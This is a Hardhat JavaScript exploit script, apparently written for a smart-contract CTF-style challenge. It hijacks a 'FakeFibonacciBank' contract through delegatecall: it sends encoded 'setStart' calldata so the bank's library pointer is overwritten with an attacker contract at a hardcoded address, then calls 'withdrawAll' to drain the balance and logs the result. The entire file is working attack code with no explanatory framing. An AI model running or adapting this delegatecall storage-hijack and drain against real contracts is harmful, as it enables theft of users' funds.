// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const { sign } = require("crypto");
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  // We get the contract to deploy
  // const ffLibAttackFactory = await ethers.getContractFactory("FakeFibonacciLibAttack");
  // const ffLibAttack = await ffLibAttackFactory.deploy();
  // await ffLibAttack.deployed();

  // console.log("FakeFibonacciLibAttack deployed to:", ffLibAttack.address);

  // change ffLib address
  // console.log('ffLibAttack.address:', ffLibAttack.address);
  const [signer] = await hre.ethers.getSigners();
  const ffLibAttack = await ethers.getContractAt(
    require('../artifacts/contracts/FakeFibonacci.sol/FakeFibonacciLibAttack.json').abi,
    '0x6F2C9E7e27e446b0A87805Bd409dd871abD40264',
    signer
  );

  const ffLibInterface = new ethers.utils.Interface(require('../artifacts/contracts/FakeFibonacci.sol/FakeFibonacciLib.json').abi)
  const attackDelegateCallData = ffLibInterface.encodeFunctionData('setStart', [ffLibAttack.address]);
  console.log('attackDelegateCallData:', attackDelegateCallData);

  const ff = await ethers.getContractAt(
    require('../artifacts/contracts/FakeFibonacci.sol/FakeFibonacciBank.json').abi,
    '0x46764c0d5b09bba00e8d0bce78f7871a3cc9888b',
    signer
  );

  await signer.sendTransaction({
    to: ff.address,
    from: signer.address,
    data: attackDelegateCallData,
  });

  console.log('start:', await ff.start());
  console.log('fakeFibonacciLibrary:', await ff.fakeFibonacciLibrary());

  const withdrawAllData = ffLibAttack.interface.encodeFunctionData('withdrawAll', []);
  console.log('withdrawAllData:', withdrawAllData);

  await signer.sendTransaction({
    to: ff.address,
    from: signer.address,
    data: withdrawAllData,
    gasLimit: 200000
  });

  const provider = hre.network.provider;
  console.log('ff balance:', ethers.BigNumber.from(await provider.send('eth_getBalance', [ff.address])).toString());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
